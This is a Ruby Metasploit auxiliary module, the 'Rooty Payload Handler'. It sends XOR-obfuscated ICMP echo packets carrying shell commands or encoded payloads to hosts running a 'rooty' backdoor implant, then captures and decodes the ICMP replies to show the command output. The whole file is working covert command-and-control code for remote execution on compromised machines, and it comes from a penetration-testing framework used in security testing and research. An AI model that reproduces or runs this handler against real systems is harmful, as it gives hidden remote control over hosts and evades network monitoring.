##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ManualRanking

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rooty Payload Handler',
      'Description'    => %q{
        This module will send a ICMP "encrypted" packet with a payload or command to execute to a host running rooty.
      },
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'EXITFUNC' => 'thread', },
      'Author'         =>  ['hal'],
      'References'     =>  [ ],
      'Payload'        =>
        {
          'Space'       => 1500,
          'BadChars'    => '',
          'DisableNops' => true,
        },
      'Platform'       => %w{ linux bsd win },
      'Arch'           => ARCH_ALL,
      'Targets'        => [ [ 'Universal', { } ] ],
      'DefaultTarget'  => 0
      ))

      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
      register_options(
      [
        OptString.new('SHOST',   [false, 'The source address of the ICMP packet', nil]),
        OptString.new('CMD',     [false, 'The command to execute on the host', nil]),
        OptInt.new('TIMEOUT',     [false, 'How long to wait for responses.', 2]),
      ], self.class)
  end

  def run_host(ip)
    check_pcaprub_loaded

    open_pcap
    pcap = self.capture
    capture_sendto(build_icmp(ip), ip)

    data = ""
    begin
      Timeout.timeout(datastore['TIMEOUT']) do
        each_packet do |pkt|
          p = PacketFu::Packet.parse(pkt)
          next unless p.is_icmp?
	  next unless p.ip_saddr == ip
    
          #key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
          key = (p.payload.each_byte.to_a[0] ^ p.payload.each_byte.to_a[1]) & 0xff
         
          decoded = p.payload.each_byte.map {|c| (c^key).chr }.join

          if decoded[4..10] == "GOATSE\x02"
            data << decoded[11..-1]
          end
        end
      end
    rescue Timeout::Error
      # Ignore 
    end

    close_pcap

    if data.size > 0
	print_good("#{ip}: #{data}".chomp)
    else
      # print_error "No response received."
    end
  end


  def build_icmp(ip)
    icmp_id = rand(65535) + 1
    
    if datastore['CMD'].nil? || datastore['CMD'] == ''
      if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
        fail_with(Failure::BadConfig, "CMD was not specified and no PAYLOAD was set")
      else
        data = "GOATSE\x01" + payload.encoded
      end
    else
      data = "GOATSE\x02" + datastore['CMD'] + "\x00"
    end

    key = (icmp_id & 0xff) ^ ((icmp_id >> 8) & 0xff)
       
    p = PacketFu::ICMPPacket.new
    p.icmp_type = 8
    p.icmp_code = 0
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = ip
    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
    p.recalc
    return p
  end
end
